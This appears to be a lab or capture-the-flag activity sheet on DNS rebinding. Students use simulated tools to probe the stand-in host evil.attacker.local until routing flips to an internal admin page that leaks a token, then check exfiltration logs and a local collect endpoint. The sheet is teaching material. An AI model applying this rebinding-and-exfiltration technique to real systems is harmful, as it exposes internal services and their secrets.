# Activity 2: Delayed Flip and Exfiltration

## Objective

Model time-based rebinding behavior using a delayed host flip.
Track how repeated requests trigger routing transition.
Validate token capture with exfiltration evidence.

There are two parts to this activity.

## Part 1: Triggering a Delayed Rebinding Flip

Start in the workspace:

```bash
cd /home/labDirectory
```

Arm delayed mode:

```bash
labfctl arm 3
```

The threshold value `3` means the mapping flips after three qualifying probes.

Probe the same hostname and path repeatedly:

```bash
fetch-sim evil.attacker.local /admin
fetch-sim evil.attacker.local /admin
fetch-sim evil.attacker.local /admin
```

### What to Observe

- Early requests can still be attacker-side.
- After threshold, routing changes to internal admin.
- A response should contain a token in `IITB{...}` format.

## Part 2: Evidence and Validation

Inspect exfil evidence/logs:

```bash
labfctl logs exfil
```

If you need manual confirmation, you may post to the collection endpoint at `http://127.0.0.1:8084/collect`.

## Optional Visibility

Browser UI:

`http://127.0.0.1:8080`

Routing trace:

```bash
labfctl logs proxy
```

## Submission

Write only the recovered token into `SUBMIT_FLAG.txt`.

Do not include command output, logs, or extra text.
